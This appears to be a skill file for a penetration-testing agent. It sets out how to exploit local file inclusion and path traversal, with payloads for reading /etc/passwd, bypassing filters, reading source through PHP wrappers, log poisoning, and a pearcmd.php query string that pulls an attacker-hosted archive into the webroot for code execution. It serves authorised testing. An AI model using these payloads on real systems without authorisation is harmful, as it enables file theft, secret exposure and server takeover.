---
name: web-lfi-path-traversal
description: >
  Local File Inclusion / path traversal → read files, sometimes RCE. Load when a param names a
  file/path/template/page: ?file=, ?page=, ?template=, ?download=, ?lang=, or path segments.
  Signals: filenames in params, "include", download endpoints, `../` filtered, `.php?page=`.
domain: web
type: technique
stability: learning
modes: [pentest, bugbounty]
severity: high
owasp: [A01:2021-Broken-Access-Control]
cwe: [CWE-22, CWE-98]
tools: [burp, ffuf]
schema_version: 1
---

# LFI / path traversal

## When it applies
A parameter or path segment controls which file the server reads/includes. Path traversal reads
arbitrary files; LFI (include) can execute them → RCE.

## Why it works
The app builds a filesystem path from user input without normalizing/constraining it, so `../`
sequences escape the intended directory. If the value is `include`d (PHP), included content is executed.

## Method
1. **Read a canary**: `?file=/etc/passwd`, then traversal `?file=../../../../etc/passwd`; on
   Windows `..\..\..\windows\win.ini`.
2. **Defeat filters**: URL-encode `..%2f`, double `..%252f`, `....//` (strip-once), overlong
   `%c0%af`, null `%00` (old PHP), absolute paths, nested `....`.
3. **PHP wrappers → source/RCE**: `php://filter/convert.base64-encode/resource=index.php`
   (read source), `data://`/`expect://`, and **log poisoning** (write PHP into a log via
   User-Agent, then include the log) or session/`/proc/self/environ` inclusion for RCE.
4. **PEAR `pearcmd.php` LFI→RCE** (very common on PHP hosts with `register_argc_argv=On` and PEAR
   installed): include `/usr/local/lib/php/pearcmd.php` and pass args via the query string, e.g.
   `?file=/usr/local/lib/php/pearcmd.php&+install+--installroot=/var/www/html+<attacker.tgz-URL>`
   to write attacker-controlled content into the webroot, then request it. The trick is that
   `register_argc_argv` lets `pearcmd` read `argv` from the URL query — no upload needed.
5. **Enumerate targets**: config files, keys, app source, history files, and an exposed
   `/.git/` (grab `.git/HEAD`/`config` → dump the repo → `git log -p` for deleted secrets);
   `ffuf` a LFI wordlist.

## Gotchas
- A forced extension (`include $p.".php"`) blocks arbitrary read → try wrappers or null byte (old PHP).
- Traversal (read-only) vs LFI (include→exec) are different ceilings — check whether output is executed.
- Read the app's own source via `php://filter` to find the next bug faster.

## Verify success
Contents of a file outside the intended directory returned (e.g. `/etc/passwd`, app config/
source), or code execution via a wrapper/log-poisoning include.

## References
PortSwigger path-traversal labs; LFI-to-RCE cheat sheets; OWASP path traversal.
